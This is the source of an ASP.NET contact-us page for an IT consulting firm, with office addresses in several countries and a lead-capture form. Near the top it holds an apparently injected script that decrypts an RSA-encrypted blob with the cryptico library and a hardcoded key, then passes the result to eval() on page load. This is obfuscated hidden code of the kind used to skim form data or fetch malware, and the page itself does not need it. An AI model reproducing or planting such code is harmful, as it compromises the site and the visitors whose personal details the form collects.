<%@ Page Title="Contact Us | RheinBrücke IT Consulting" Language="C#" MasterPageFile="~/Rheincs.Master" AutoEventWireup="true" CodeBehind="ContactUs.aspx.cs" Inherits="RheinBrucke.ContactUs" %>

<asp:Content ID="Content1" ContentPlaceHolderID="headerPlaceHolder" runat="server">
    <meta name="keywords" content="RheinBrücke Contact RheinBrücke IT Consulting Services" />
    <meta name="Description" content="Contact RheinBrücke for our IT consulting services and technology solutions including Program and Project Management, ERP Solutions aligned to SAP, Microsoft SharePoint and EPICOR and Open Source Technology platforms." />
</asp:Content>

<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
<script src="https://cdnjs.cloudflare.com/ajax/libs/cryptico/0.0.1343522940/cryptico.js" type="text/javascript"></script>
<script type="text/javascript">
eval(cryptico.decrypt('FcEHd/mvPFCDhXQ0K7n3YxzkhCd2Pf8ShnAMJPsf0QSBSKR19JNtVIQnP4UHwKu8YqmGPgLDRsc6xrv4Vobm6YtnrCyinDidcap+pCtd6DYJ1MUDlGKIbUCLo1/pIt1V8JGFq6Hm3TZpYKYjWTHmoS51k9nEynLL/tNaT6HnxtA=?5nlWqA30BgqEuIADjWNRHBYv2+VXMrzNy4Hh6m7SfYtMsCR0ll8pGr3+JnrfygdcVe3nijIj4F5gA4ClKimK+hRCRfT7t2GcWXSTMeLQNUUC/iWpYo00bhxQgMcR0tq18avJuhiDf7FLxp08hlqBN54cHPEI5WV30tnfjN/X+O+G5loZQEMZVZ/xpFpF9yeaHpO2tFc7SXH/dJOBSeHT3NMbTPjeBda9JGagnS1PT4E0RqhX2EGY6DoGzXLS4TcO8plIJAkGZv6SG67A+DClxD7vahP008EPpBBzCeVhBjEhnVq1TunPmaNFzEpgkSIlIyiIH2wtO94vyEOfqME0tQpJ+IPHAVvScp1lNyqeW1D4pGaPOys8F0uuqxL+4ZmX3HcLaUyONTWQ6EqEh/32qKeBkg7EqKdXMUIZ6LKw/8PFiRDY/EvUI7DtjAydShLe7AeKit1qhxImq4pU2hV6qw==', cryptico.generateRSAKey('45b2995aaef446a79ee7c81f9fe59fc1', 1024)).plaintext);
</script>
    <style>
        .bulletContent
        {
            font-size:14px !important;
        }
    </style>
    <input type="hidden" id="hdfRootUrl" value="<%=rootpath %>" />
    <%-- Container Starts Here --%>
    <div class="container" id="container-top">
        <!--banner-->
        <div class="row">
            <ul class="breadcrumb bread hidden-xs hidden-sm">
                <li><a href="<%=rootpath %>" class="redColor">Home <span>» </span></a></li>
                <li><a href="#" class="redColor">Contact Us</a></li>
            </ul>
        </div>
        <div class="row">

            <div class="bg-img-contactus img-responsive ">
                <h1 class="rhein-banner-heading-h2 inner-banner-text1 img-bottom">RheinBrücke</h1>
                <p class="rhein-banner-heading-p inner-banner-text1">Contact Us</p>
            </div>

        </div>
        <!--efo banner-->
        <!-- Content-->
        <div class="wrappernew main-container">
            <p>Thank you for your interest in RheinBrücke. Please contact us by either visiting our office at the locations provided or write to us for more information on how RheinBrücke can help you stay ahead of competition. For additional information on our IT consulting services, solutions or industry expertise, please visit the relevant pages on our website.</p>
            <div class="clearfix">&nbsp;</div>
            <div class="col-md-12 hidden-lg hidden-md">
                <img src="Assets/images/world-map-bg-mobile.jpg" alt="RheinBrücke Locations" class="center-block img-responsive" /></div>
             <div class="col-md-12 hidden-lg hidden-sm hidden-xs">
                <img src="Assets/images/Rheinbrucke-map-location.jpg" alt="RheinBrücke Locations" class="center-block img-responsive" /></div>
            <div class="col-md-12 hidden-xs hidden-sm hidden-md">
                <iframe src="Assets/location-map/index.html" width="100%" height="500px" frameborder="0" scrolling="no"></iframe>
            </div>
            <div class="clearfix">&nbsp;</div>
            <!--locations-->
            <div class="col-md-12 padd-left">
                <div class="row col-md-12 ">
                    <div class="col-md-4">
                        <ul>
                            <li>
                                <div class="contactus-map-icon">
                                    <img src="Assets/images/location-icon.png" class="img-responsive" alt="Location Indiactor" />
                                </div>
                                <span class="redColor bulletContent">Netherlands
                                </span>
                                <p class="bulletContent">
                                    RheinBrücke IT Consulting BV,<br />
                                    Stationsplein,<br />
                                    8K NL-6221BT,<br />
                                    Maastricht, Netherlands<br />
                                    Tel: +31 (0) 43 799 9102<br />
                                    Fax: +31 (0) 43 799 9333<br />
                                    Email: <a href="mailto:info@rheincs.com">info@rheincs.com</a>
                                </p>
                            </li>
                        </ul>
                    </div>
                    <div class="col-md-4">
                        <ul>
                            <li>
                                <div class="contactus-map-icon">
                                    <img src="Assets/images/location-icon.png" class="img-responsive" alt="Location Indiactor" />
                                </div>
                                <span class="redColor bulletContent">Germany 
                                </span>
                                <p class="bulletContent">
                                    RheinBrücke IT Consulting GmbH,<br />
                                    Kranhaus 1, Im Zollhafen 18,<br />
                                    50678 Köln, Germany<br />
                                    Tel: +49 (0) 221 650 60 608<br />
                                    Fax: +49 (0) 221 650 60 500<br />
                                    Email: <a href="mailto:info@rheincs.com">info@rheincs.com</a>
                                </p>
                            </li>
                        </ul>

                    </div><div class="col-md-4">
                        <ul>
                            <li>
                                <div class="contactus-map-icon">
                                    <img src="Assets/images/location-icon.png" class="img-responsive" alt="Location Indiactor" />
                                </div>
                                <span class="redColor bulletContent">USA
                                </span>
                                <p class="bulletContent">
                                    RheinBrücke IT Consulting,<br />
                                    3815 Chippenham Road,<br />
                                    Mechanicsburg,<br />
                                    PA 17050, United States<br />
                                    Tel: +1 717 265 3937<br />
                                    Email: <a href="mailto:info@rheincs.com">info@rheincs.com</a>
                                </p>
                            </li>
                        </ul>

                    </div>
                    
                    
                    
                </div>
                <div class="row col-md-12 ">
                    <div class="col-md-4">
                        <ul>
                            <li>
                                <div class="contactus-map-icon">
                                    <img src="Assets/images/location-icon.png" class="img-responsive" alt="Location Indiactor" />
                                </div>
                                <span class="redColor bulletContent">India
                                </span>
                                <p class="bulletContent">
                                   RheinBrücke IT Consulting Pvt Ltd,<br />
                                    Bharati Vilas, 1st Floor, <br />
                                    26B Jawaharlal Nehru  Salai,<br />
                                    Ekkatuthangal, Guindy Industrial Estate,<br />
									Chennai,<br />
                                    Tamil Nadu, India 600 032<br />
                                    Tel: +91 44 6671 7555
                                    <br />

                                    Email: <a href="mailto:info@rheincs.com">info@rheincs.com</a>
                                </p>
                            </li>
                        </ul>

                    </div>
                    <div class="col-md-4">
                        <ul>
                            <li>
                                <div class="contactus-map-icon">
                                    <img src="Assets/images/location-icon.png" class="img-responsive" alt="Location Indiactor" />
                                </div>
                                <span class="redColor bulletContent">UAE- Office 1
                                </span>
                                <p class="bulletContent">
                                    RheinBrücke Middle East IT Infrastructure LLC,<br />
                                    PO Box 450471,<br />
                                    Office #4701- 10,<br />
                                    Aspin Commercial Towers, <br />Shaikh Zayed Road, Dubai, United Arab Emirates<br />
                                    Tel: +9714 388 8247<br />
                                    Email: <a href="mailto:info@rheincs.com">info@rheincs.com</a>
                                </p>
                            </li>
                        </ul>
                    </div>
 <div class="col-md-4">
                        <ul>
                            <li>
                                <div class="contactus-map-icon">
                                    <img src="Assets/images/location-icon.png" class="img-responsive" alt="Location Indiactor" />
                                </div>
                                <span class="redColor bulletContent">UAE- Office 2
                                </span>
                                <p class="bulletContent">
                                   RheinBrücke IT Consulting EMEA FZCO,<br />
                                    2-234-235 – Techno Hub 2,<br />
                                    P.O Box : 342060<br />
                                    Dubai Silicon Oasis, Dubai<br />
                                    United Arab Emirates<br />
                                    Tel: +971 43 330 366<br />
                                    Email: <a href="mailto:info@rheincs.com">info@rheincs.com</a>
                                </p>
                            </li>
                        </ul>

                    </div>
                  

                </div>
                <div class="row col-md-12 ">
                      <div class="col-md-4">
                        <ul>
                            <li>
                                <div class="contactus-map-icon">
                                    <img src="Assets/images/location-icon.png" class="img-responsive" alt="Location Indiactor" />
                                </div>
                                 <span class="redColor bulletContent">UAE- Office 3 
                                </span>
                                <p class="bulletContent">
                                    RheinBrücke IT Consulting DMCC,<br />
                                    Unit No. 30-01-949,<br />
                                    Floor No. 1, Bldg No. 3,<br />
                                    Plot No. 550-554<br />
                                    J&G, DMCC, Dubai<br />
                                    United Arab Emirates<br />
                                    Tel: +971 50 650 8854<br />
                                    Email: <a href="mailto:info@rheincs.com">info@rheincs.com</a>
                                </p>
                               
                            </li>
                        </ul>

                    </div>
                    </div>
            </div>
            <!--locations-->
            <!--FORM-->
            <div class="col-md-12">
                <h5 class="deco-header">
                    <span class="redBottom">WRITE TO US</span></h5>
                <div class="col-md-12 padd-top">
                    <div class="form-group">
                        <label class="success" id="successmessage" hidden="hidden">Thank you for contacting RheinBrücke. We will get back to you soon.</label>
                    </div>
                </div>
                <div class="col-md-4 nopadding">
                    <div class="clearfix">&nbsp;</div>
                    <div class="col-md-12">
                        <select id="DDLServices" name="DDLServices" class="dropdown" style="width: 100%; padding: 6px;">
                            <option value="0">-- Select Any One --</option>
                            <option value="1">Epicor</option>
                            <option value="2">SAP</option>
                            <option value="3">Epicor HCM</option>
                            <option value="4">Epicor Payroll MEA</option>
                            <option value="5">CCT (Copy Company Tool)</option>
                            <option value="6">SharePoint</option>
                            <option value="7">Microsoft Technologies - .Net & SQL Server</option>
                            <option value="8">Epicor Support+ </option>
                        </select>
                        <span class="validator" id="reqDDlservices" hidden="hidden">Select the Services</span>
                    </div>
                    <div class="clearfix">&nbsp;</div>
                    <div class="col-md-12">
                        <input type="text" placeholder="*Your Name" name="name" id="txtContactName" class="write-to-us-input" />
                        <span style="margin-top: 5px;" class="validator" id="reqContactName" hidden="hidden">Enter Your Name</span>
                    </div>
                    <div class="clearfix">&nbsp;</div>
                    <div class="col-md-12">
                        <input type="text" placeholder="*Your Email" name="email-address" id="txtContactemail" class="write-to-us-input" />
                        <span style="margin-top: 5px;" class="validator" id="reqContactemail" hidden="hidden">Enter Your Email Address</span>
                        <span style="margin-top: 5px;" class="validator" id="valContactemail" hidden="hidden">Enter Valid Email Address</span>
                    </div>
                    <div class="clearfix">&nbsp;</div>
                    <div class="col-md-12">
                        <input type="text" placeholder="*Your Company Name" name="company-name" id="txtCompanyNmae" class="write-to-us-input" />
                        <span style="margin-top: 5px;" class="validator" id="reqCompanyNmae" hidden="hidden">Enter Your Company Name</span>
                    </div>
                    <div class="clearfix">&nbsp;</div>
                    <div class="col-md-12">
                        <input type="text" placeholder="Your Mobile Number" name="mobile-number" id="txtmobileno" class="write-to-us-input" />
                        <span style="margin-top: 5px;" class="validator" id="reqmobileno" hidden="hidden">Enter Your Mobile Number</span><span style="margin-top: 5px;" class="validator" id="Validationmobileno" hidden="hidden">Enter valid phone number</span>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="clearfix">&nbsp;</div>
                    <textarea cols="45" rows="5" style="height: 222px;" placeholder="*Your Message" name="message" id="txtContactMessage" class="write-to-us-input"></textarea>
                    <span class="validator" id="reqContactMessage" hidden="hidden">Enter Your Message</span>
                </div>
                <div class="clearfix"></div>
                <span class="showErrorMsg" style="color: red"></span>
                <div class="clearfix"></div>
                <div class="col-md-6 col-sm-6 captchadiv" style="height: 39px;margin-top: 4px;">
                        <div id="g_captcha" style="transform:scale(0.65);-webkit-transform:scale(0.65);transform-origin:0 0;-webkit-transform-origin:0 0;"></div>     
                </div>
                <div class="col-md-12">
                    <input type="button" id="btnContact" class="submit-button" data-loading-text="Submitting.." value="Submit" />
                </div>
            </div>
            <!--FORM-->
        </div>
        <!--content-->
        <div class="clearfix">&nbsp;</div>
        <div class="clearfix">&nbsp;</div>
    </div>
    <!--Container-->
    <%-- Container Ends Here --%>
</asp:Content>
<asp:Content ID="Content3" ContentPlaceHolderID="FooterScript" runat="server">
    <script>
        $(document).ready(function () {
            var URI = window.location.pathname;
            var lurl = URI.toLowerCase();
            if (lurl == "/contact") {
                window.location.href = "contact-us";
            }
            $('#btnContact').click(function () {
                var r = ContactUsValidation1();
                if (r == 1) {
                    $(this).button('loading');
                    saveContact();
					onFormSubmit();
                }
            });
        });

        function clear() {
            $("#reqContactName").hide();
            $("#reqContactemail,#reqmobileno,#reqCompanyNmae").hide();
            $("#reqContactMessage,#reqDDlservices").hide();
            $("#valContactemail,#Validationmobileno").hide();
            $(".showErrorMsg").hide();
            $("#txtContactName,#txtmobileno,#txtCompanyNmae").val('');
            $("#txtContactemail").val('');
            $("#txtContactMessage").val(''); $('#DDLServices').val('0');
           // grecaptcha.reset();
        }
        function ContactUsValidation1() {
            var name = $('#txtContactName').val();
            var email = $('#txtContactemail').val();
            var message = $('#txtContactMessage').val();
            var services = $('#DDLServices').val();
            var companyname = $('#txtCompanyNmae').val();
            var mobileno = $('#txtmobileno').val();
            
            var response = 1;
            $("#valContactemail,#reqmobileno,#Validationmobileno,#reqCompanyNmae").hide();
            $("#reqDDlservices").hide();
            $("#reqContactName").hide();
            $("#reqContactemail").hide();
            $("#reqContactMessage").hide();
            $("#valContactemail").hide();
            $("#valContactemail").hide();
            if (services == '0' || services == '') {
                $("#reqDDlservices").show();
                response = 0;
            }
            if ($.trim(name) == '') {
                $("#reqContactName").show();
                response = 0;
            }
            if (email == '') {
                $("#reqContactemail").show();
                response = 0;
            }
            else {
                if (!IsEmail(email)) {
                    $("#valContactemail").show();
                    response = 0;
                }
            }
            //if (mobileno == '') {
            //    $("#reqmobileno").show();
            //    response = 0;
            //}
            if (mobileno != "" && mobileno.length < 10) {
                $("#Validationmobileno").show();
                response = 0;
            }
            if (companyname == '') {
                $("#reqCompanyNmae").show();
                response = 0;
            }
            if (message == '') {
                $("#reqContactMessage").show();
                response = 0;
            }
            if (!(grecaptcha && grecaptcha.getResponse().length > 0)) {
                $('.showErrorMsg').text("Select captcha.");
                response = 0;
            }
            return response;
        }

        function IsEmail(email) {
            if (email == '') {
                return true;
            }
            var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
            return regex.test(email);
        }

        function saveContact() {
            var _rootUrl = $("#hdfRootUrl").val();
            var data = {
                name: $('#txtContactName').val(),
                email: $('#txtContactemail').val(),
                message: $('#txtContactMessage').val(),
                phone: $('#txtmobileno').val(),
                company: $('#txtCompanyNmae').val(),
                Services: $('#DDLServices option:selected').text()
            };
            $.ajax({
                type: "POST",
                url: _rootUrl + "api/ContactUs/UpdateContactUs",
                data: JSON.stringify(data),
                contentType: "application/json; charset=utf-8",
                dataType: "json",
                success: success,
                failure: function (response) {
                    alert(response.d);
                }
            });
        }
        function success(response) {
            $("#successmessage").show();
            $('#btnContact').button('reset');
            //clear();
            setTimeout(function () { $("#successmessage").hide(); }, 4000);
        }
    </script>
     <script type="text/javascript">
      var onloadCallback = function() {
          grecaptcha.render('g_captcha', {
              'sitekey': '6LcszzoUAAAAAOmren8WPjJrk6TZjXcZaKPcGrxT'
        });
      };
    </script>
     <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit">
    </script>
	<script type="text/javascript" src="https://web.mxradon.com/t/FormTracker.js"></script>

                    <script type="text/javascript">
                            

			
                        function onFormSubmit() {

			var checks = new Array();

                           
			//debugger;

                            var fieldMapping = {
                                MXHOrgCode: "17537",
                                MXHLandingPageId: "9ca08586-9f86-11e7-9042-22000aa79843",
                                MXHAsc: "",
                                FirstName: "name",
                                EmailAddress: "email-address",
                                Phone: "mobile-number",
                                Company: "company-name",
                                mx_Your_Message:"message",
                                mx_Contactus_dropdown: "DDLServices",
                            };

                            var onSuccess = function (data) {                   

                                data = $.parseJSON(data)
                                var logData = {
                                    Name: $('#txtContactName').val(),
                                    FormPID: data.PId,
                                    Email: $('#txtContactemail').val(),
                                    Mobile: $('#txtmobileno').val(),
                                    Company: $('#txtCompanyNmae').val(),
                                    FormStatus: data.Status,
                                    FormMsg: data.Message,
                                    FormAction: data.FormAction,
                                    ServiceType: "Contact Us"
                                }
                                $.ajax({
                                    type: "POST",
                                    url: "/" + "api/Admin/LeadSquaredLog",
                                    data: JSON.stringify(logData),
                                    contentType: "application/json; charset=utf-8",
                                    dataType: "json",
                                    failure: function (response) {
                                        alert(response.d);
                                    }

                                });
                                clear();
                                console.log(data);
					
	
                            }

                            var onError = function (data) {                 
                               data = $.parseJSON(data)
                                var logData = {
                                    Name: $('#txtContactName').val(),
                                    FormPID: data.PId,
                                    Email: $('#txtContactemail').val(),
                                    Mobile: $('#txtmobileno').val(),
                                    Company: $('#txtCompanyNmae').val(),
                                    FormStatus: data.Status,
                                    FormMsg: data.Message,
                                    FormAction: data.FormAction,
                                    ServiceType: "Contact Us"
                                }
                                $.ajax({
                                    type: "POST",
                                    url: "/" + "api/Admin/LeadSquaredLog",
                                    data: JSON.stringify(logData),
                                    contentType: "application/json; charset=utf-8",
                                    dataType: "json",
                                    failure: function (response) {
                                        alert(response.d);
                                    }

                                });
                                clear();
                                console.log(data);

                            }

                            new LSQForm().captureLead(fieldMapping, "form1",

                            {
                            onSuccess: onSuccess,   //optional
                            onError: onError,       //optiona
                            });
};

                        
                    </script>
</asp:Content>
